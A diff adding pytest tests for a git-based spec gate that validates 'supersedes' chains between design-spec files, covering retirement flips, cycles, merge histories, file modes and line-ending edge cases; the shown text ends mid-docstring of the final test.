+def test_depth_two_retirement_commit_mode_admits_status_only_flip(repo):
+    """Spec done_when[0], A2 and A3: N and P staged in one commit; then N committed first and P flipped next."""
+    retirement_lineage(repo)
+    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
+    write(repo, N_SPEC, spec(supersedes=P_SPEC))
+    write(repo, P_SPEC, flipped_p())
+    _git(repo, "add", "-A")
+    r = gate(repo, "--commit")
+    assert r.returncode == 0 and ROUND_EIGHT not in r.stdout, r.stdout
+    _git(repo, "reset", "-q", "--hard")
+    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
+    write(repo, N_SPEC, spec(supersedes=P_SPEC))
+    _git(repo, "add", "-A")
+    assert gate(repo, "--commit").returncode == 0
+    _git(repo, "commit", "-q", "-m", "v3 names v2")
+    write(repo, P_SPEC, flipped_p())
+    _git(repo, "add", "-A")
+    r = gate(repo, "--commit")
+    assert r.returncode == 0 and ROUND_EIGHT not in r.stdout, r.stdout
+
+
+def test_longer_chain_retirement_passes_and_traversal_terminates(repo):
+    """Spec done_when[0], A4: R superseded (null), Q superseded names R, P approved names Q; N added, P flipped."""
+    on_base(repo, {R_SPEC: spec(status="superseded"), SPEC: spec(status="superseded", supersedes=R_SPEC), P_SPEC: spec(supersedes=SPEC)})
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
+    assert r.returncode == 0 and "spec gate ok" in r.stdout and "chain" not in r.stdout, r.stdout
+
+
+def test_new_pointer_to_superseded_target_still_refused(repo):
+    """Spec done_when[1], B1 and B2: a new or changed pointer at an already-superseded target keeps the round-eight refusal."""
+    retirement_lineage(repo, **{D_SPEC: spec(status="draft")})
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=SPEC)})
+    assert r.returncode == 1 and f"{N_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
+    r = pr(repo, RETIRE_BRANCH, {D_SPEC: spec(status="draft", supersedes=SPEC)})
+    assert r.returncode == 1 and f"{D_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
+
+
+def test_draft_to_approved_with_stale_pointer_refused(repo):
+    """Spec done_when[1], B3: approving a draft in place whose unchanged pointer names a superseded spec is not the exempt edit."""
+    retirement_lineage(repo, **{D_SPEC: spec(status="draft", supersedes=SPEC)})
+    r = pr(repo, RETIRE_BRANCH, {D_SPEC: spec(supersedes=SPEC)})
+    assert r.returncode == 1 and f"{D_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
+
+
+def test_flip_with_changed_pointer_refused(repo):
+    """Spec done_when[1], B4: a flip that also moves the pointer is refused in place and by round eight."""
+    retirement_lineage(repo, **{R_SPEC: spec(status="superseded")})
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: spec(status="superseded", supersedes=R_SPEC)})
+    assert r.returncode == 1 and f"{P_SPEC}: an approved spec does not change in place" in r.stdout, r.stdout
+    assert f"{P_SPEC}: supersedes {R_SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
+
+
+def test_flip_without_valid_replacement_refused_both_ways(repo):
+    """Spec done_when[1], B5: no N, a draft N, or another FEAT's N leaves the flip refused (PR and commit modes)."""
+    retirement_lineage(repo)
+    missing = f"{P_SPEC}: marked superseded, but no approved spec for its FEAT names it in `supersedes`"
+    for files in ({P_SPEC: flipped_p()},
+                  {P_SPEC: flipped_p(), N_SPEC: spec(status="draft", supersedes=P_SPEC)},
+                  {P_SPEC: flipped_p(), N_SPEC: spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]", supersedes=P_SPEC)}):
+        r = pr(repo, RETIRE_BRANCH, files)
+        assert r.returncode == 1 and missing in r.stdout and f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, (files, r.stdout)
+        _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
+        for path, text in files.items():
+            write(repo, path, text)
+        _git(repo, "add", "-A")
+        r = gate(repo, "--commit")
+        assert r.returncode == 1 and missing in r.stdout, (files, r.stdout)
+        _git(repo, "reset", "-q", "--hard")
+
+
+def test_extra_predecessor_bytes_refused(repo):
+    """Spec done_when[1], B6: the enumerated byte changes beyond the status line in P (a done_when word, trailing
+    whitespace, CRLF, a changed blank line) leave the exemption unreached, with today's messages; the status line
+    itself is covered by test_flip_changes_only_the_status_entry_and_hides_no_key. The gate reads text with CRLF folded, so
+    the in-place rule does not see the CRLF variant on main or here; it is refused by round eight on both (executed
+    against main a79ac45d: round eight alone), and the exemption judges the bytes so the flip is not admitted."""
+    retirement_lineage(repo)
+    base_flip = flipped_p()
+    variants = {
+        "done_when word": flipped_p(done_when=["something easier", DONE[1]]),
+        "trailing whitespace": base_flip.replace("# Body\n", "# Body \n", 1),
+        "CRLF": base_flip.replace("\n", "\r\n"),
+        "changed blank line": base_flip.replace("---\n\n# Body", "---\n\n\n# Body", 1),
+    }
+    for label, text in variants.items():
+        assert text != base_flip, label
+        r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: text})
+        assert r.returncode == 1, (label, r.stdout)
+        assert f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, (label, r.stdout)
+        if label != "CRLF":
+            assert f"{P_SPEC}: an approved spec does not change in place" in r.stdout, (label, r.stdout)
+
+
+def test_inherited_invalid_own_pointer_refused_on_flip(repo):
+    """Spec done_when[2], B7 (baseline control): P's own inherited pointer is bad; today's L1512 to L1518 messages hold."""
+    missing_q = "docs/superpowers/specs/2026-08-01-model-gone.md"
+    for pointer, message in ((missing_q, "which is not a spec on the base"),
+                             ("./" + SPEC, "which is not a spec on the base"),
+                             ("docs/superpowers/specs/2026-08-02-data-q.md", "a spec for FEAT-DATA-001, not FEAT-MODEL-001")):
+        extra = {"docs/superpowers/specs/2026-08-02-data-q.md": spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]")}
+        on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(supersedes=pointer), **extra})
+        r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: spec(status="superseded", supersedes=pointer)})
+        assert r.returncode == 1 and f"{P_SPEC}: supersedes" in r.stdout and message in r.stdout, (pointer, r.stdout)
+
+
+def test_deeper_inherited_edge_refused(repo):
+    """Spec done_when[2], B7b: Q's own pointer (the second edge) is noncanonical, missing or cross-FEAT. Main refuses the
+    fixture only by round eight on P's pointer and never examines Q's edge; the chain messages name the defect."""
+    data_r = "docs/superpowers/specs/2026-08-02-data-r.md"
+    missing_r = "docs/superpowers/specs/2026-08-01-model-gone.md"
+    cases = (
+        ("./" + R_SPEC, {R_SPEC: spec(status="superseded")},
+         f"{P_SPEC}: supersedes chain reaches {'./' + R_SPEC!r}, which is not written as docs/superpowers/specs/<file>.md"),
+        (missing_r, {}, f"{P_SPEC}: supersedes chain breaks at {missing_r}, which is not a spec on the base"),
+        (data_r, {data_r: spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]", status="superseded")},
+         f"{P_SPEC}: supersedes chain reaches {data_r}, a spec for FEAT-DATA-001, not FEAT-MODEL-001"),
+    )
+    for q_pointer, extra, message in cases:
+        on_base(repo, {SPEC: spec(status="superseded", supersedes=q_pointer), P_SPEC: spec(supersedes=SPEC), **extra})
+        r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
+        assert r.returncode == 1 and message in r.stdout, (q_pointer, r.stdout)
+
+
+def test_deleted_ancestor_is_not_read_from_base(repo):
+    """Spec done_when[2], B7c and C6: the change flips P beside N and deletes Q; the chain refuses at Q as deleted
+    (never falling back to the base copy) beside the existing deletion refusal."""
+    retirement_lineage(repo)
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p(), SPEC: None})
+    assert r.returncode == 1 and f"{SPEC}: a superseded spec is not deleted" in r.stdout, r.stdout
+    assert f"{P_SPEC}: supersedes chain breaks at {SPEC}, which this change deletes" in r.stdout, r.stdout
+
+
+def test_supersedes_cycle_refused(repo):
+    """Spec done_when[3], B8 to B11: a self-cycle, a two-spec cycle in one change, a cycle closed against the base and a
+    draft-level cycle are each refused with the revisits message (main has no cycle check; B11 passes there)."""
+    n2 = "docs/superpowers/specs/2026-09-06-model-decisions-v4.md"
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=N_SPEC)})
+    assert r.returncode == 1 and f"{N_SPEC}: supersedes chain revisits {N_SPEC} (cycle)" in r.stdout, r.stdout
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=n2), n2: spec(supersedes=N_SPEC)})
+    assert r.returncode == 1 and f"{N_SPEC}: supersedes chain revisits {N_SPEC} (cycle)" in r.stdout, r.stdout
+    assert f"{n2}: supersedes chain revisits {n2} (cycle)" in r.stdout, r.stdout
+    a, b = P_SPEC, N_SPEC
+    on_base(repo, {a: spec(supersedes=b), b: spec()})
+    r = pr(repo, RETIRE_BRANCH, {b: spec(supersedes=a)})
+    assert r.returncode == 1 and f"{b}: supersedes chain revisits {b} (cycle)" in r.stdout, r.stdout
+    on_base(repo, {a: spec(status="draft", supersedes=b), b: spec(status="draft")})
+    r = pr(repo, RETIRE_BRANCH, {b: spec(status="draft", supersedes=a)})
+    assert r.returncode == 1 and f"{b}: supersedes chain revisits {b} (cycle)" in r.stdout, r.stdout
+
+
+def test_simultaneous_draft_edit_cycle_uses_head_value(repo):
+    """Spec done_when[3], B11b: N (new) names draft D while the same change points D at N; the overlay reads D's staged
+    pointer, so the cycle is found from N and from D."""
+    on_base(repo, {D_SPEC: spec(status="draft")})
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=D_SPEC), D_SPEC: spec(status="draft", supersedes=N_SPEC)})
+    assert r.returncode == 1 and f"{N_SPEC}: supersedes chain revisits {N_SPEC} (cycle)" in r.stdout, r.stdout
+    assert f"{D_SPEC}: supersedes chain revisits {D_SPEC} (cycle)" in r.stdout, r.stdout
+
+
+def test_redundant_flip_after_base_advance_gets_merge_main_diagnostic(repo):
+    """Spec done_when[4], row C1 (BA1, P supersedes Q; replaces the companion plan's C1 row): main retired P after the
+    fork and the branch's P equals the current base's P, so the step 5 refusal appears beside the round-eight refusal
+    that still applies to N's pointer. Its text promises no merge result."""
+    retirement_lineage(repo)
+    n2 = "docs/superpowers/specs/2026-09-06-model-decisions-v4.md"
+    r = divergent_pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()},
+                     {n2: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
+    assert r.returncode == 1 and f"{P_SPEC}: {REDUNDANT}" in r.stdout, r.stdout
+    assert f"{N_SPEC}: supersedes {P_SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
+
+
+def test_pointer_to_target_superseded_after_fork_refused(repo):
+    """Spec done_when[4], C2 (BA2, baseline control): N's pointer is new and P is superseded at the current base."""
+    retirement_lineage(repo)
+    n2 = "docs/superpowers/specs/2026-09-06-model-decisions-v4.md"
+    r = divergent_pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC)}, {n2: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
+    assert r.returncode == 1 and f"{N_SPEC}: supersedes {P_SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
+
+
+def test_merge_of_main_carrying_the_flip_is_not_rechecked(repo):
+    """Spec done_when[4], C3 (BA3, baseline control): a merge of main in progress brings the flip of P; measured against
+    MERGE_HEAD, P is not in the change and is not re-checked."""
+    retirement_lineage(repo)
+    n2 = "docs/superpowers/specs/2026-09-06-model-decisions-v4.md"
+    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
+    write(repo, "docs/notes.md", "notes\n")
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "branch work")
+    on_base(repo, {n2: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
+    _git(repo, "checkout", "-q", RETIRE_BRANCH)
+    _git(repo, "merge", "-q", "--no-commit", "--no-ff", "main")
+    assert (repo / ".git/MERGE_HEAD").exists()
+    r = gate(repo, "--commit")
+    assert r.returncode == 0 and ROUND_EIGHT not in r.stdout and P_SPEC not in r.stdout, r.stdout
+
+
+def test_unchanged_ancestry_is_read_at_the_current_base(repo):
+    """Spec done_when[4], C5 (BA5, baseline control): draft D names approved Q at the fork; main retires Q; approving D
+    in place is refused by round eight because Q is read at the current base, never the merge base."""
+    q2 = "docs/superpowers/specs/2026-09-06-model-decisions-q2.md"
+    on_base(repo, {D_SPEC: spec(status="draft", supersedes=SPEC)})
+    r = divergent_pr(repo, RETIRE_BRANCH, {D_SPEC: spec(supersedes=SPEC)}, {q2: spec(supersedes=SPEC), SPEC: spec(status="superseded")})
+    assert r.returncode == 1 and f"{D_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
+
+
+def test_unrelated_draft_edit_beside_retirement_passes(repo):
+    """Spec done_when[5], A8: an unrelated draft's text edit rides beside N and the flip of P; its empty lineage and N's
+    lineage (N, P, Q, null) both pass."""
+    retirement_lineage(repo, **{D_SPEC: spec(status="draft")})
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p(), D_SPEC: spec(status="draft") + "\nmore words\n"})
+    assert r.returncode == 0, r.stdout
+
+
+def test_retirement_leaves_done_plans_unbound_and_untouched(repo):
+    """Spec done_when[5], B15: a done plan on the base cites P; a docs/ branch retirement reads, rebinds and reports no plan."""
+    done_plan = "docs/superpowers/plans/2026-09-02-model-decisions-v2.md"
+    retirement_lineage(repo, **{done_plan: plan(spec=P_SPEC, branch="feature/feat-model-001-v2", status="done", pr=7)})
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
+    assert r.returncode == 0 and "plan" not in r.stdout, r.stdout
+    assert _git(repo, "show", f"HEAD:{done_plan}") == plan(spec=P_SPEC, branch="feature/feat-model-001-v2", status="done", pr=7).strip()
+
+
+def test_traversal_bound_on_sixty_chained_specs(repo):
+    """Spec done_when[6], D2 and D3: sixty chained specs; the chain walk makes at most one tree read per distinct spec in
+    the union of the head and base spec lists, the gate run completes, and --check-spec runs no chain check."""
+    chain = [f"docs/superpowers/specs/2026-07-{1 + i // 31:02d}-model-chain-{i:02d}.md" for i in range(60)]
+    files = {chain[0]: spec(status="superseded")}
+    for prev, cur in zip(chain, chain[1:-1]):
+        files[cur] = spec(status="superseded", supersedes=prev)
+    files[chain[-1]] = spec(supersedes=chain[-2])
+    on_base(repo, files)
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=chain[-1]), chain[-1]: spec(status="superseded", supersedes=chain[-2])})
+    assert r.returncode == 0 and "spec gate ok" in r.stdout, r.stdout
+    sg = load_gate(repo)
+    base, head = base_and_head(repo)
+    changed = _git(repo, "diff", "--name-only", "--no-renames", base, head).splitlines()
+    ch = sg.Change("pr", RETIRE_BRANCH, changed, sg.Tree(head), sg.Tree(base), sg.Tree(base))
+    reads: list[str] = []
+    real_read = sg.Tree.read
+    try:
+        sg.Tree.read = lambda self, path: (reads.append(path), real_read(self, path))[1]
+        errs = sg.check_chain(sg.frontmatter(real_read(sg.Tree(head), N_SPEC)), N_SPEC, ch)
+    finally:
+        sg.Tree.read = real_read
+    distinct = set(sg.Tree(head).list(sg.SPECS)) | set(sg.Tree(base).list(sg.SPECS))
+    assert errs == [] and 0 < len(reads) <= len(distinct) and len(set(reads)) == len(reads), (len(reads), len(distinct))
+    r = gate(repo, "--check-spec", N_SPEC)
+    assert r.returncode == 0 and r.stdout.strip() == "spec ok", r.stdout
+
+
+def test_crlf_relabel_of_a_superseded_spec_is_not_called_redundant(repo):
+    """IMPL-CICD1 R1 F1, under the replacement spec's step 5: P is already superseded at the merge base, so a CRLF
+    relabel of it carries no retirement and keeps main's verdict (step 6, row C1d's shape): the null-pointer relabel
+    is admitted, and the relabel of a P naming a superseded Q is refused by round eight alone, with no step 5 line.
+    (At 8814e1c1 the old merge-main text fired here.)"""
+    on_base(repo, {P_SPEC: spec(status="superseded")})
+    r = pr(repo, RETIRE_BRANCH, {P_SPEC: spec(status="superseded").replace("\n", "\r\n")})
+    assert r.returncode == 0 and "already superseded on the current base" not in r.stdout, r.stdout
+    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(status="superseded", supersedes=SPEC)})
+    r = pr(repo, RETIRE_BRANCH, {P_SPEC: spec(status="superseded", supersedes=SPEC).replace("\n", "\r\n")})
+    assert r.returncode == 1 and f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
+    assert "already superseded on the current base" not in r.stdout, r.stdout
+
+
+def test_cr_only_line_endings_take_the_flip_and_refuse_extra_bytes(repo):
+    """IMPL-CICD1 R1 F2: the byte-level status strip treats a lone CR as a line break, as `Tree.read` does, so a
+    CR-only spec is retired by the same status-only flip (positive control; at 8814e1c1 round eight refused it), while
+    the enumerated byte changes in such a file still leave the exemption unreached with today's messages (negative
+    controls): a done_when word is refused in place and by round eight, a relabel to LF beside the flip by round
+    eight alone, since the folded text is equal. No spec in the repository carries a CR byte; this measures the
+    anchor, not a live case."""
+    cr = lambda s: s.replace("\n", "\r")
+    on_base(repo, {SPEC: cr(spec(status="superseded")), P_SPEC: cr(spec(supersedes=SPEC))})
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: cr(flipped_p())})
+    assert r.returncode == 0 and "spec gate ok" in r.stdout, r.stdout
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: cr(flipped_p(done_when=["something easier", DONE[1]]))})
+    assert r.returncode == 1 and f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
+    assert f"{P_SPEC}: an approved spec does not change in place" in r.stdout, r.stdout
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
+    assert r.returncode == 1 and f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
+    assert "does not change in place" not in r.stdout, r.stdout
+
+
+def test_nul_byte_in_an_inherited_pointer_is_refused_not_a_traceback(repo):
+    """IMPL-CICD1 R1 F3: an unchanged base spec whose pointer carries a NUL byte names no git path; the chain walk
+    refuses it as not written canonically, with the ordinary verdict and no traceback (at 8814e1c1 `git show`
+    raised an uncaught ValueError: exit 1, empty stdout). Main d806bfd1 admits the change, never reading that edge."""
+    nul = "docs/superpowers/specs/\x00x.md"
+    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(supersedes=nul)})
+    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC)})
+    assert r.returncode == 1 and "SPEC GATE FAILED" in r.stdout, (r.stdout, r.stderr)
+    assert f"{N_SPEC}: supersedes chain reaches {nul!r}, which is not written as docs/superpowers/specs/<file>.md" in r.stdout, r.stdout
+    assert "Traceback" not in r.stderr, r.stderr
+
+
+def test_mode_only_change_of_a_superseded_spec_is_not_called_redundant(repo):
+    """IMPL-CICD2 R1 F1, under the replacement spec's step 5: a mode-only change (100644 to 100755, bytes identical)
+    to a P already superseded at the merge base carries no retirement and keeps main's verdict (step 6): a P naming
+    a superseded Q is refused by round eight alone and a null-pointer P is admitted, with no step 5 line."""
+    chmod = lambda root: (root / P_SPEC).chmod(0o755)
+    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(status="superseded", supersedes=SPEC), N_SPEC: spec(supersedes=P_SPEC)})
+    r = pr(repo, RETIRE_BRANCH, {}, then=chmod)
+    assert r.returncode == 1 and f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
+    assert "already superseded on the current base" not in r.stdout, r.stdout
+    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(status="superseded"), N_SPEC: spec(supersedes=P_SPEC)})
+    r = pr(repo, RETIRE_BRANCH, {}, then=chmod)
+    assert r.returncode == 0 and "spec gate ok" in r.stdout, r.stdout
+
+
+def mode_divergent_pr(repo: Path, branch_files: dict[str, str | None], branch_modes: dict[str, int],
+                      main_files: dict[str, str | None], main_modes: dict[str, int]) -> subprocess.CompletedProcess:
+    """`divergent_pr` with modes: the branch, cut from `base`, writes `branch_files` and sets `branch_modes`; main then
+    writes `main_files` and sets `main_modes`; the gate judges the branch against main's tip, the merge base kept."""
+    _git(repo, "reset", "-q", "--hard")
+    _git(repo, "clean", "-qfd")
+    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
+    for path, text in branch_files.items():
+        write(repo, path, text)
+    for path, mode in branch_modes.items():
+        (repo / path).chmod(mode)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", f"change on {RETIRE_BRANCH}")
+    head = _git(repo, "rev-parse", "HEAD")
+    on_base(repo, main_files, then=lambda root: [(root / path).chmod(mode) for path, mode in main_modes.items()])
+    return gate(repo, "--pr", _git(repo, "rev-parse", "base"), head, PR_HEAD_REF=RETIRE_BRANCH)
+
+
+def test_merge_main_advice_follows_the_mode_a_merge_of_main_keeps(repo):
+    """IMPL-CICD3 R1 F1 rows. Name kept from the 2026-10-31 contract because the gate's suite only grows (a test on the branch is not dropped); the body asserts the 2026-11-01 replacement spec's step 5. Main retired P after the fork and the branch flipped P to the same text; whatever
+    the modes on the merge base, the branch and main, the change repeats main's retirement and step 5 refuses it with
+    its one message, which predicts no merge; when the branch's text differs it is not a redundant retirement and
+    no step 5 line appears. Round eight still refuses N's pointer in every row."""
+    refused = f"{N_SPEC}: supersedes {P_SPEC}, {ROUND_EIGHT}"
+    n2 = "docs/superpowers/specs/2026-09-06-model-decisions-v4.md"
+    main = {n2: spec(supersedes=P_SPEC), P_SPEC: flipped_p()}
+    for name, merge_base_mode, branch_p, branch_mode, main_mode in (
+            ("main set +x, branch left the mode", 0o644, flipped_p(), 0o644, 0o755),
+            ("main cleared +x, branch left the mode", 0o755, flipped_p(), 0o755, 0o644),
+            ("both set +x", 0o644, flipped_p(), 0o755, 0o755),
+            ("main kept the mode, branch set +x", 0o644, flipped_p(), 0o755, 0o644),
+            ("main kept the mode, branch cleared +x", 0o755, flipped_p(), 0o644, 0o755),
+            ("main set +x, branch bytes differ", 0o644, flipped_p() + "\nA branch note.\n", 0o644, 0o755)):
+        on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(supersedes=SPEC)},
+                then=lambda root: (root / P_SPEC).chmod(merge_base_mode))   # P's mode on the merge base, per row
+        r = mode_divergent_pr(repo, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: branch_p}, {P_SPEC: branch_mode},
+                              main, {P_SPEC: main_mode})
+        assert r.returncode == 1 and refused in r.stdout, (name, r.stdout)
+        assert (f"{P_SPEC}: {REDUNDANT}" in r.stdout) is (branch_p == flipped_p()), (name, r.stdout)
+        assert "merge main so the file leaves" not in r.stdout and "repeats that retirement" not in r.stdout, (name, r.stdout)
+
+
+def test_merge_main_advice_is_withheld_outside_regular_files_and_one_merge_base(repo):
+    """IMPL-CICD4 R1 F1 and F2 shapes. Name kept from the 2026-10-31 contract because the gate's suite only grows (a test on the branch is not dropped); the body asserts the 2026-11-01 replacement spec's step 5. (1) Main turned P into a symlink whose target text is the flipped P;
+    (2) a criss-cross history with two merge bases holding P at different modes. Neither depends on a merge
+    prediction now: step 5 refuses both with its one message, beside round eight on N's pointer."""
+    refused = f"{N_SPEC}: supersedes {P_SPEC}, {ROUND_EIGHT}"
+    n2 = "docs/superpowers/specs/2026-09-06-model-decisions-v4.md"
+    retirement_lineage(repo)
+    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
+    write(repo, N_SPEC, spec(supersedes=P_SPEC))
+    write(repo, P_SPEC, flipped_p())
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "flip P, regular file")
+    head = _git(repo, "rev-parse", "HEAD")
+    _git(repo, "checkout", "-q", "main")
+    write(repo, n2, spec(supersedes=P_SPEC))
+    (repo / P_SPEC).unlink()
+    os.symlink(flipped_p(), repo / P_SPEC)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "main: P as a symlink")
+    assert _git(repo, "ls-tree", "HEAD", "--", P_SPEC).split()[0] == "120000"
+    r = gate(repo, "--pr", _git(repo, "rev-parse", "main"), head, PR_HEAD_REF=RETIRE_BRANCH)
+    assert r.returncode == 1 and refused in r.stdout and f"{P_SPEC}: {REDUNDANT}" in r.stdout, r.stdout
+    assert "merge main so the file leaves" not in r.stdout and "repeats that retirement" not in r.stdout, r.stdout
+    # (2) criss-cross: P at 755 on the fork point; the branch side sets 644 (X), main's side leaves 755 (Y); each
+    # merges the other's commit, so X and Y are both merge bases. The branch flips P at 755, main at 644.
+    _git(repo, "reset", "-q", "--hard")
+    _git(repo, "checkout", "-q", "-B", "main", "base")
+    (repo / P_SPEC).chmod(0o755)
+    _git(repo, "commit", "-q", "-am", "P at 755")
+    fork = _git(repo, "rev-parse", "HEAD")
+    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, fork)
+    write(repo, "docs/x.md", "x\n")
+    (repo / P_SPEC).chmod(0o644)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "X")
+    x = _git(repo, "rev-parse", "HEAD")
+    _git(repo, "checkout", "-q", "main")
+    write(repo, "docs/y.md", "y\n")
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "Y")
+    y = _git(repo, "rev-parse", "HEAD")
+    _git(repo, "merge", "-q", "--no-edit", x)
+    _git(repo, "checkout", "-q", RETIRE_BRANCH)
+    _git(repo, "merge", "-q", "--no-edit", y)
+    write(repo, N_SPEC, spec(supersedes=P_SPEC))
+    write(repo, P_SPEC, flipped_p())
+    (repo / P_SPEC).chmod(0o755)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "flip P at 755")
+    head = _git(repo, "rev-parse", "HEAD")
+    _git(repo, "checkout", "-q", "main")
+    write(repo, n2, spec(supersedes=P_SPEC))
+    write(repo, P_SPEC, flipped_p())
+    (repo / P_SPEC).chmod(0o644)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "main flips P at 644")
+    main_tip = _git(repo, "rev-parse", "HEAD")
+    assert len(_git(repo, "merge-base", "--all", main_tip, head).split()) == 2
+    assert _git(repo, "ls-tree", _git(repo, "merge-base", main_tip, head), "--", P_SPEC).split()[0] == "100755"
+    r = gate(repo, "--pr", main_tip, head, PR_HEAD_REF=RETIRE_BRANCH)
+    assert r.returncode == 1 and refused in r.stdout and f"{P_SPEC}: {REDUNDANT}" in r.stdout, r.stdout
+    assert "merge main so the file leaves" not in r.stdout and "repeats that retirement" not in r.stdout, r.stdout
+
+
+def crisscross_pr(repo: Path, x_mode: int, y_mode: int, branch_files: dict[str, str], head_mode: int,
+                  main_files: dict[str, str], main_mode: int) -> subprocess.CompletedProcess:
+    """From `base`: a fork commit sets P to `y_mode`; the branch side X writes docs/x.md and sets P to `x_mode`, main's
+    side Y writes docs/y.md (both named after the fork, so every call commits); each merges the other, so X and Y are both merge bases. The branch then writes
+    `branch_files` with P at `head_mode`, main writes `main_files` with P at `main_mode`; the gate judges the branch."""
+    _git(repo, "reset", "-q", "--hard")
+    _git(repo, "checkout", "-q", "-B", "main", "base")
+    (repo / P_SPEC).chmod(y_mode)
+    _git(repo, "commit", "-q", "--allow-empty", "-am", "fork")
+    fork = _git(repo, "rev-parse", "HEAD")
+    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, fork)
+    write(repo, "docs/x.md", f"x {fork}\n")
+    (repo / P_SPEC).chmod(x_mode)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "X")
+    x = _git(repo, "rev-parse", "HEAD")
+    _git(repo, "checkout", "-q", "main")
+    write(repo, "docs/y.md", f"y {fork}\n")
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "Y")
+    y = _git(repo, "rev-parse", "HEAD")
+    _git(repo, "merge", "-q", "--no-edit", x)
+    _git(repo, "checkout", "-q", RETIRE_BRANCH)
+    _git(repo, "merge", "-q", "--no-edit", y)
+    for path, text in branch_files.items():
+        write(repo, path, text)
+    (repo / P_SPEC).chmod(head_mode)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "branch change")
+    head = _git(repo, "rev-parse", "HEAD")
+    _git(repo, "checkout", "-q", "main")
+    for path, text in main_files.items():
+        write(repo, path, text)
+    (repo / P_SPEC).chmod(main_mode)
+    _git(repo, "add", "-A")
+    _git(repo, "commit", "-q", "-m", "main change")
+    main_tip = _git(repo, "rev-parse", "HEAD")
+    assert len(_git(repo, "merge-base", "--all", main_tip, head).split()) == 2
+    return gate(repo, "--pr", main_tip, head, PR_HEAD_REF=RETIRE_BRANCH)
+
+
+def test_redundant_flip_is_refused_whatever_the_mode_or_history(repo):
+    """IMPL-CICD5 R2 F1 rows, under the replacement spec's step 5. A null-pointer flip main already made after the fork
+    (no round eight to refuse it otherwise) is refused in every shape: linear with any mode combination, criss-cross
+    histories and a symlink on main, with the one step 5 message. Main admits every such row (rc 0). Outside the
+    retirement (P already superseded at the fork, only its mode changed) the result is main's (step 6, rc 0), and an
+    added P identical to main's superseded copy is refused by step 5."""
